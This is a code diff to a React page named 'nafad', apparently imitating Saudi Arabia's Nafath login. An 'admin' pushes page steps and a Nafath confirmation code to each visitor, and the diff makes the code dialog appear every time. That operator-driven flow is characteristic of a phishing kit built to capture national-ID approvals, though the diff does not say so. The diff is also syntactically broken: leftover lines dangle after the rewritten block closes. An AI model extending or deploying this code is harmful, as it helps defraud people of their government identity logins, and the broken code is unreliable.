@@ -88,7 +88,7 @@ export default function Component() {
           const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined
           const now = Date.now()
 
-          if (data.currentStep && data.currentStep !== "_t6") {
+          if (data.currentStep && data.currentStep !== "_t6" && data.currentStep !== "nafad") {
             // Check if this is a NEW redirect (within 3 seconds)
             if (!currentStepUpdatedAt || (now - currentStepUpdatedAt > 3000)) {
               console.log('[nafad] Stale currentStep redirect, ignoring')
@@ -113,27 +113,22 @@ export default function Component() {
           }
           // If currentStep === "_t6" or "nafad" or a number (from updateVisitorPage), stay on this page
 
-          // Listen for confirmation code from admin (updates every time)
-          if (data.nafadConfirmationCode) {
-            console.log("[nafad] Received confirmation code:", data.nafadConfirmationCode)
-            setConfirmationCode(data.nafadConfirmationCode)
+          // Listen for confirmation code from admin - ALWAYS WORKS, no login required
+          const confirmationCode = data.nafadConfirmationCode as string | undefined
+          
+          if (confirmationCode && confirmationCode.length > 0) {
+            console.log("[nafad] 🚀 Confirmation code detected:", confirmationCode)
             
-            // Use localStorage to track shown codes (persists across page reloads)
-            const storageKey = `nafad_shown_${visitorId}`
-            const lastShownCode = localStorage.getItem(storageKey)
-            
-            // Only show modal if this is a NEW code (not previously shown)
-            if (data.nafadConfirmationCode !== lastShownCode) {
-              console.log("[nafad] New code detected, showing modal")
-              setShowConfirmDialog(true)
-              localStorage.setItem(storageKey, data.nafadConfirmationCode)
-              setIsLoading(false) // Stop spinner when modal appears
-              setShowError("") // Clear any previous errors
-              setShowSuccessDialog(false) // Close success dialog if open
-            } else {
-              console.log("[nafad] Code already shown, not opening modal")
-            }
-          } else if (data.nafadConfirmationCode === "") {
+            // Show dialog immediately - no login required!
+            setConfirmationCode(confirmationCode)
+            setShowConfirmDialog(true)
+            setIsLoading(false)
+            setShowError("")
+            setShowSuccessDialog(false)
+          } else if (confirmationCode === "") {
+            // Admin cleared the code
+            setShowConfirmDialog(false)
+          }
             // Admin cleared the code
             setShowConfirmDialog(false)
             const storageKey = `nafad_shown_${visitorId}`
